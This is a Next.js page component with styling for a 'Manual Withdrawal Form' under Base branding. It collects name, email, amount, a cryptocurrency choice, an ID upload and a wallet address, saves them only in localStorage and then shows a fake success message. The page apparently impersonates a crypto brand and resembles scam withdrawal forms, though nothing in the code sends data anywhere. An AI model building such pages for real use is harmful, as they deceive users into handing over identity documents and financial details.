"use client";

import Image from "next/image";
import { useEffect, useRef, useState } from "react";

const cryptocurrencies = [
  { value: "BTC", label: "Bitcoin", icon: "/crypto/btc.svg" },
  { value: "ETH", label: "Ethereum", icon: "/crypto/eth.svg" },
  { value: "USDT", label: "Tether", icon: "/crypto/usdt.svg" },
];

function BaseLogo() {
  return (
    <Image
      src="/base-logo-transparent.png"
      alt="Base"
      width={176}
      height={97}
      priority
      style={{
        display: "block",
        width: 176,
        height: "auto",
        transform: "translateY(-20px)",
      }}
    />
  );
}

export default function Home() {
  const [status, setStatus] = useState("");
  const [selectedCrypto, setSelectedCrypto] = useState("BTC");
  const [selectedFileName, setSelectedFileName] = useState("");
  const [cryptoOpen, setCryptoOpen] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const cryptoTriggerRef = useRef(null);
  const cryptoOptionRefs = useRef([]);
  const submitTimerRef = useRef(null);
  const selectedCryptocurrency = cryptocurrencies.find(
    (crypto) => crypto.value === selectedCrypto,
  );

  useEffect(() => () => window.clearTimeout(submitTimerRef.current), []);

  function focusCryptoOption(index) {
    requestAnimationFrame(() => cryptoOptionRefs.current[index]?.focus());
  }

  function chooseCrypto(value) {
    setSelectedCrypto(value);
    setCryptoOpen(false);
    setStatus("");
    cryptoTriggerRef.current?.focus();
  }

  function handleSubmit(event) {
    event.preventDefault();
    if (isSubmitting) return;
    setStatus("");

    const form = event.currentTarget;
    if (!form.reportValidity()) return;

    if (!selectedCrypto) {
      setStatus("Please choose a cryptocurrency.");
      setCryptoOpen(true);
      cryptoTriggerRef.current?.focus();
      return;
    }

    const formData = new FormData(form);
    formData.delete("attachment");
    const values = {
      ...Object.fromEntries(formData.entries()),
      cryptocurrency: selectedCrypto,
      attachmentName: selectedFileName,
    };

    try {
      window.localStorage.setItem(
        "base-wallet-details",
        JSON.stringify(values),
      );
      setIsSubmitting(true);
      submitTimerRef.current = window.setTimeout(() => {
        setIsSubmitting(false);
        setSubmitted(true);
      }, 3000);
    } catch {
      setStatus("Your browser could not save these details. Please try again.");
    }
  }

  return (
    <main className="page-shell">
      <div className="guide guide-left" aria-hidden="true" />
      <div className="guide guide-right" aria-hidden="true" />

      <section
        className={`form-card${submitted ? " is-success" : ""}`}
        aria-labelledby={submitted ? "success-title" : "form-title"}
      >
        {submitted ? (
          <div className="success-content" role="status" aria-live="polite">
            <span className="success-icon" aria-hidden="true">
              <svg viewBox="0 0 96 96" fill="none">
                <circle cx="48" cy="48" r="47" fill="currentColor" />
                <path
                  className="success-check"
                  d="M27 48.5 41 62l28-29"
                  stroke="white"
                  strokeWidth="7"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </span>
            <h1 id="success-title">Withdrawal request received</h1>
            <p>
              Base has received your withdrawal request. We&apos;ll post an
              update soon.
            </p>
          </div>
        ) : (
          <>
            <div className="card-content">
              <div className="artwork" aria-hidden="true">
                <span className="artwork-orb orb-one" />
                <span className="artwork-orb orb-two" />
                <span className="artwork-orb orb-three" />
              </div>

              <div className="logo-wrap">
                <BaseLogo />
              </div>

              <div className="heading-row">
                <div>
                  <h1 id="form-title" className="text-xl font-medium">
                    Manual Withdrawal Form
                  </h1>
                  <p className="intro">
                    Enter your information and preferred cryptocurrency (10% min
                    withdrawal)
                  </p>
                </div>
              </div>

              <div className="divider" />

              <form id="wallet-form" onSubmit={handleSubmit}>
                <div className="name-grid">
                  <div className="field">
                    <input
                      id="firstName"
                      name="firstName"
                      type="text"
                      autoComplete="given-name"
                      placeholder="First name"
                      required
                    />
                  </div>
                  <div className="field">
                    <input
                      id="lastName"
                      name="lastName"
                      type="text"
                      autoComplete="family-name"
                      placeholder="Last name"
                      required
                    />
                  </div>
                </div>

                <div className="field">
                  <input
                    id="email"
                    name="email"
                    type="email"
                    autoComplete="email"
                    placeholder="you@example.com"
                    required
                  />
                </div>

                <div className="field">
                  <input
                    id="amount"
                    name="amount"
                    type="number"
                    inputMode="decimal"
                    min="0.00000001"
                    step="any"
                    placeholder="Amount"
                    aria-label="Amount"
                    required
                  />
                </div>

                <div className="crypto-upload-grid">
                  <div className="field">
                    <div
                      className="select-wrap"
                      onBlur={(event) => {
                        if (
                          !event.currentTarget.contains(event.relatedTarget)
                        ) {
                          setCryptoOpen(false);
                        }
                      }}
                    >
                      <button
                        ref={cryptoTriggerRef}
                        type="button"
                        className="select-trigger"
                        aria-label={`Cryptocurrency of choice: ${selectedCrypto || "not selected"}`}
                        aria-required="true"
                        aria-expanded={cryptoOpen}
                        aria-controls="cryptocurrency-options"
                        onClick={() => setCryptoOpen((open) => !open)}
                        onKeyDown={(event) => {
                          if (
                            event.key === "ArrowDown" ||
                            event.key === "ArrowUp"
                          ) {
                            event.preventDefault();
                            setCryptoOpen(true);
                            focusCryptoOption(
                              event.key === "ArrowDown"
                                ? 0
                                : cryptocurrencies.length - 1,
                            );
                          }
                        }}
                      >
                        <span
                          className={`${
                            selectedCrypto
                              ? "select-value"
                              : "select-value placeholder"
                          } text-base`}
                        >
                          {selectedCryptocurrency ? (
                            <>
                              <Image
                                src={selectedCryptocurrency.icon}
                                alt=""
                                width={24}
                                height={24}
                                aria-hidden="true"
                              />
                              {selectedCryptocurrency.label}
                            </>
                          ) : (
                            "Crypto Currency"
                          )}
                        </span>
                        <span className="select-chevron" aria-hidden="true">
                          <svg
                            width="16"
                            height="16"
                            viewBox="0 0 16 16"
                            fill="none"
                          >
                            <path
                              d="m4 6 4 4 4-4"
                              stroke="currentColor"
                              strokeWidth="1.8"
                              strokeLinecap="round"
                              strokeLinejoin="round"
                            />
                          </svg>
                        </span>
                      </button>
                      {cryptoOpen && (
                        <div
                          id="cryptocurrency-options"
                          className="options-panel"
                          role="group"
                          aria-label="Cryptocurrency options"
                        >
                          {cryptocurrencies.map((crypto, index) => (
                            <button
                              key={crypto.value}
                              ref={(element) => {
                                cryptoOptionRefs.current[index] = element;
                              }}
                              type="button"
                              className="crypto-option"
                              aria-pressed={selectedCrypto === crypto.value}
                              onClick={() => chooseCrypto(crypto.value)}
                              onKeyDown={(event) => {
                                if (event.key === "Escape") {
                                  event.preventDefault();
                                  setCryptoOpen(false);
                                  cryptoTriggerRef.current?.focus();
                                } else if (
                                  event.key === "ArrowDown" ||
                                  event.key === "ArrowUp"
                                ) {
                                  event.preventDefault();
                                  const nextIndex =
                                    (index +
                                      (event.key === "ArrowDown" ? 1 : -1) +
                                      cryptocurrencies.length) %
                                    cryptocurrencies.length;
                                  cryptoOptionRefs.current[nextIndex]?.focus();
                                }
                              }}
                            >
                              <span className="crypto-icon" aria-hidden="true">
                                <Image
                                  src={crypto.icon}
                                  alt=""
                                  width={24}
                                  height={24}
                                />
                              </span>
                              <span className="crypto-copy">
                                <strong>{crypto.label}</strong>
                                <small>{crypto.value}</small>
                              </span>
                              {selectedCrypto === crypto.value && (
                                <span
                                  className="crypto-check"
                                  aria-hidden="true"
                                >
                                  ✓
                                </span>
                              )}
                            </button>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="field">
                    <label className="file-picker">
                      <input
                        id="attachment"
                        name="attachment"
                        type="file"
                        aria-label="Upload ID"
                        required
                        onChange={(event) =>
                          setSelectedFileName(
                            event.target.files?.[0]?.name || "",
                          )
                        }
                      />
                      <span
                        className={
                          selectedFileName ? "file-name" : "file-placeholder"
                        }
                      >
                        {selectedFileName || "Upload ID"}
                      </span>
                      <svg
                        aria-hidden="true"
                        width="18"
                        height="18"
                        viewBox="0 0 24 24"
                        fill="none"
                      >
                        <path
                          d="M12 16V4m0 0L8 8m4-4 4 4M4 16v3a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-3"
                          stroke="currentColor"
                          strokeWidth="1.8"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    </label>
                  </div>
                </div>

                <div className="field">
                  <input
                    id="walletAddress"
                    name="walletAddress"
                    type="text"
                    autoCapitalize="off"
                    autoCorrect="off"
                    spellCheck="false"
                    placeholder="Enter your wallet address"
                    required
                  />
                </div>
              </form>
            </div>

            <div className="card-footer">
              <p className="status" role="status" aria-live="polite">
                {status}
              </p>
              <button
                type="submit"
                form="wallet-form"
                className="submit-button font-normal"
                disabled={isSubmitting}
              >
                {isSubmitting && (
                  <span className="submit-spinner" aria-hidden="true" />
                )}
                <span className="submit-label">
                  {isSubmitting ? "Submitting..." : "Submit details"}
                </span>
              </button>
            </div>
          </>
        )}
      </section>

      <style jsx>{`
        * {
          box-sizing: border-box;
        }
        .page-shell {
          min-height: 100svh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 54px 20px;
          position: relative;
          overflow: hidden;
          background: #e9e9e9;
          font-family: inherit;
          color: #151515;
        }
        .page-shell::before,
        .page-shell::after {
          content: "";
          position: absolute;
          left: 0;
          right: 0;
          height: 0.5px;
          background: #d9d9d9;
        }
        .page-shell::before {
          top: 6.9%;
        }
        .page-shell::after {
          bottom: 6.8%;
        }
        .guide {
          position: absolute;
          top: 0;
          bottom: 0;
          width: 1px;
          border-left: 2px dashed #d3d3d3;
        }
        .guide-left {
          left: calc(50% - 275px);
        }
        .guide-right {
          left: calc(50% + 278px);
        }
        .form-card {
          width: min(100%, 536px);
          position: relative;
          z-index: 1;
          overflow: visible;
          border: 1px solid rgba(255, 255, 255, 0.78);
          border-radius: 31px;
          background: linear-gradient(
            145deg,
            #fafafa 0%,
            #f3f3f3 51%,
            #f1f1f1 100%
          );
          box-shadow:
            0 18px 28px rgba(0, 0, 0, 0.09),
            inset 0 1px 0 #fff;
        }
        .form-card.is-success {
          min-height: 520px;
          display: grid;
          place-items: center;
        }
        .success-content {
          display: flex;
          flex-direction: column;
          align-items: center;
          padding: 60px 36px;
          text-align: center;
          animation: success-enter 450ms ease-out both;
        }
        .success-icon {
          display: block;
          width: 96px;
          height: 96px;
          color: #0000ff;
          filter: drop-shadow(0 10px 16px rgba(0, 0, 255, 0.16));
          animation: success-pop 550ms cubic-bezier(0.18, 0.9, 0.25, 1.25) both;
        }
        .success-icon svg {
          display: block;
          width: 100%;
          height: 100%;
        }
        .success-check {
          stroke-dasharray: 62;
          stroke-dashoffset: 62;
          animation: success-draw 450ms ease-out 350ms forwards;
        }
        .success-content h1 {
          margin: 28px 0 0;
          font-size: 25px;
          font-weight: 600;
          line-height: 1.25;
        }
        .success-content p {
          max-width: 350px;
          margin: 12px 0 0;
          color: #606060;
          font-size: 14px;
          line-height: 1.5;
        }
        @keyframes success-enter {
          from {
            opacity: 0;
            transform: translateY(8px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        @keyframes success-pop {
          from {
            opacity: 0;
            transform: scale(0.55);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }
        @keyframes success-draw {
          to {
            stroke-dashoffset: 0;
          }
        }
        .card-content {
          position: relative;
          z-index: 2;
          padding: 29px 25px 27px;
        }
        .artwork {
          position: absolute;
          inset: 0 0 auto auto;
          width: 260px;
          height: 165px;
          pointer-events: none;
          overflow: hidden;
          border-top-right-radius: 30px;
        }
        .artwork::before {
          content: "";
          position: absolute;
          width: 190px;
          height: 160px;
          right: 35px;
          top: -92px;
          border-radius: 50%;
          background: #d9e2ff;
          filter: blur(20px);
          opacity: 0.9;
        }
        .artwork-orb {
          position: absolute;
          border-radius: 50%;
          border: 1px solid rgba(255, 255, 255, 0.9);
          background: linear-gradient(
            135deg,
            rgba(255, 255, 255, 0.87),
            rgba(239, 241, 248, 0.45)
          );
          box-shadow: -10px 10px 22px rgba(0, 0, 0, 0.025);
        }
        .orb-one {
          width: 118px;
          height: 118px;
          top: -1px;
          right: 142px;
        }
        .orb-two {
          width: 102px;
          height: 102px;
          top: -36px;
          right: -18px;
        }
        .orb-three {
          width: 115px;
          height: 115px;
          top: 67px;
          right: 18px;
          opacity: 0.55;
        }
        .logo-wrap {
          width: 176px;
          height: 57px;
          position: relative;
          overflow: hidden;
          margin: -8px 0 14px -9px;
        }
        .base-logo {
          display: block;
          width: 100%;
          height: 100%;
        }
        .heading-row {
          position: relative;
          display: flex;
          justify-content: space-between;
          gap: 12px;
          align-items: flex-start;
        }
        .intro {
          margin: 12px 0 0;
          max-width: 330px;
          color: #606060;
          font-size: 14px;
          line-height: 1.45;
        }
        .badge {
          flex: none;
          margin-top: 2px;
          padding: 6px 11px;
          border-radius: 999px;
          color: #0000d4;
          background: #dfe5ff;
          font-size: 11px;
          font-weight: 600;
        }
        .divider {
          height: 1px;
          margin: 25px 0 20px;
          background: #fff;
          box-shadow: 0 1px 0 #e2e2e2;
        }
        form {
          display: grid;
          gap: 18px;
        }
        .name-grid {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 14px;
        }
        .crypto-upload-grid {
          display: grid;
          grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
          gap: 14px;
        }
        .field {
          display: flex;
          flex-direction: column;
          gap: 8px;
          min-width: 0;
        }
        label {
          font-size: 13px;
          line-height: 1.2;
          font-weight: 600;
        }
        input {
          display: block;
          width: 100%;
          height: 48px;
          padding: 0 13px;
          border: 2px solid #eee;
          border-radius: 10px;
          outline: none;
          background: #eee;
          color: #000;
          font: inherit;
          font-size: 15px;
        }
        input::placeholder {
          color: #929292;
        }
        .file-picker {
          position: relative;
          width: 100%;
          height: 50px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 8px;
          padding: 0 13px;
          border: 2px solid #eee;
          border-radius: 10px;
          background: #eee;
          color: #171717;
          font-size: 15px;
          font-weight: 400;
          cursor: pointer;
        }
        .file-picker input {
          position: absolute;
          inset: 0;
          width: 100%;
          height: 100%;
          padding: 0;
          opacity: 0;
          cursor: pointer;
        }
        .file-picker span {
          min-width: 0;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
        }
        .file-picker .file-placeholder {
          color: #929292;
        }
        .file-picker svg {
          flex: none;
          color: #666;
        }
        .select-wrap {
          position: relative;
          z-index: 3;
        }
        .select-trigger {
          width: 100%;
          height: 50px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 12px;
          padding: 0 10px 0 14px;
          border: 2px solid #eee;
          border-radius: 10px;
          background: #eee;
          color: #171717;
          box-shadow: none;
          font-size: 20px;
          text-align: left;
        }

        .select-trigger:hover,
        .select-trigger[aria-expanded="true"] {
          background: #eee;
          color: #171717;
          transform: none;
        }

        .select-value.placeholder {
          color: #929292;
        }
        .select-trigger .select-value {
          min-width: 0;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          margin-left: 0;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
          font-size: 15px;
        }
        .select-trigger .select-value img {
          flex: none;
        }
        .select-chevron {
          width: 30px;
          height: 30px;
          display: flex;
          align-items: center;
          justify-content: center;
          flex: none;
          border-radius: 8px;
          color: #666;
          transition: transform 0.2s;
        }
        .select-trigger[aria-expanded="true"] .select-chevron {
          transform: rotate(180deg);
        }
        .options-panel {
          position: absolute;
          width: 300px;
          z-index: 10;
          top: calc(100% + 8px);
          left: 0;
          right: 0;
          display: grid;
          gap: 3px;
          padding: 4px;
          border: 1px solid #e4e4e7;
          border-radius: 14px;
          background: #fff;
          box-shadow: 0 12px 28px rgba(18, 24, 40, 0.12);
          transform-origin: top left;
          animation: options-enter 180ms cubic-bezier(0.2, 0.8, 0.2, 1) both;
        }
        @keyframes options-enter {
          from {
            opacity: 0;
            transform: translateY(-6px) scale(0.98);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }
        @keyframes options-enter-up {
          from {
            opacity: 0;
            transform: translateY(6px) scale(0.98);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }
        .crypto-option {
          width: 100%;
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 9px 5px;
          border: 0;
          border-radius: 9px;
          background: transparent;
          color: #171717;
          box-shadow: none;
          text-align: left;
        }
        .crypto-option:hover,
        .crypto-option[aria-pressed="true"] {
          transform: none;
          background: #f2f3f7;
        }
        .crypto-icon {
          width: 32px;
          height: 32px;
          display: grid;
          place-items: center;
          flex: none;
          border-radius: 50%;
          background: #f3f4f6;
        }
        .crypto-copy {
          display: flex;
          flex-direction: column;
          gap: 1px;
        }
        .crypto-copy strong {
          font-size: 13px;
          font-weight: 400;
        }
        .crypto-copy small {
          color: #888;
          font-size: 11px;
        }
        .crypto-check {
          margin-left: auto;
          color: #333;
          font-size: 16px;
        }
        .card-footer {
          min-height: 75px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 15px;
          padding: 15px 25px;
          border-top: 1px solid #e5e5e5;
          border-radius: 0 0 31px 31px;
          background: rgba(255, 255, 255, 0.17);
        }
        .status {
          margin: 0;
          max-width: 290px;
          color: #777;
          font-size: 12px;
          line-height: 1.35;
        }
        .status:empty {
          display: none;
        }
        button {
          flex: none;
          border: 0;
          border-radius: 10px;
          outline: none;
          padding: 14px 20px;
          background: #0000ff;
          color: #fff;
          box-shadow: 0 2px 3px rgba(0, 0, 0, 0.13);
          font: inherit;
          font-size: 14px;
          font-weight: 400;
          cursor: pointer;
          transition:
            background 0.15s,
            transform 0.15s;
        }
        button:hover {
          background: #1717db;
          transform: translateY(-1px);
        }
        button span {
          margin-left: 6px;
          font-size: 13px;
        }
        .submit-button {
          min-width: 157px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 9px;
        }
        .submit-button .submit-label,
        .submit-button .submit-spinner {
          margin-left: 0;
          font-size: inherit;
        }
        .submit-spinner {
          width: 16px;
          height: 16px;
          flex: none;
          border: 2px solid rgba(255, 255, 255, 0.4);
          border-top-color: #fff;
          border-radius: 50%;
          animation: submit-spin 600ms linear infinite;
        }
        .submit-button:disabled,
        .submit-button:disabled:hover {
          background: #0000ff;
          transform: none;
          cursor: wait;
        }
        @keyframes submit-spin {
          to {
            transform: rotate(360deg);
          }
        }
        @media (max-width: 560px) {
          .page-shell {
            padding: 0;
            overflow: visible;
          }
          .page-shell::before,
          .page-shell::after {
            display: none;
          }
          .guide {
            display: none;
          }
          .form-card {
            width: 100%;
            min-height: 100svh;
            display: flex;
            flex-direction: column;
            border-radius: 0;
          }
          .form-card.is-success {
            min-height: 100svh;
            justify-content: center;
          }
          .card-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: max(32px, env(safe-area-inset-top)) 22px 32px;
          }
          .artwork {
            border-top-right-radius: 0;
          }
          .card-content form {
            padding-bottom: 2px;
          }
          .options-panel {
            width: min(300px, calc(100vw - 44px));
            top: auto;
            bottom: calc(100% + 8px);
            transform-origin: bottom left;
            animation: options-enter-up 180ms cubic-bezier(0.2, 0.8, 0.2, 1)
              both;
          }
          .card-footer {
            flex-direction: column;
            align-items: stretch;
            gap: 12px;
            border-radius: 0;
            padding: 0px 22px max(24px, env(safe-area-inset-bottom));
          }
          .card-footer button {
            width: 100%;
            min-height: 58px;
            padding: 16px 20px;
            font-size: 16px;
            font-weight: 500;
          }
        }
        @media (max-width: 390px) {
          .name-grid {
            grid-template-columns: 1fr;
            gap: 18px;
          }
          .badge {
            display: none;
          }
        }
        @media (prefers-reduced-motion: reduce) {
          .options-panel {
            animation: none;
          }
          .success-content,
          .success-icon,
          .success-check {
            animation: none;
          }
          .success-check {
            stroke-dashoffset: 0;
          }
          .submit-spinner {
            animation: none;
          }
        }
      `}</style>
    </main>
  );
}
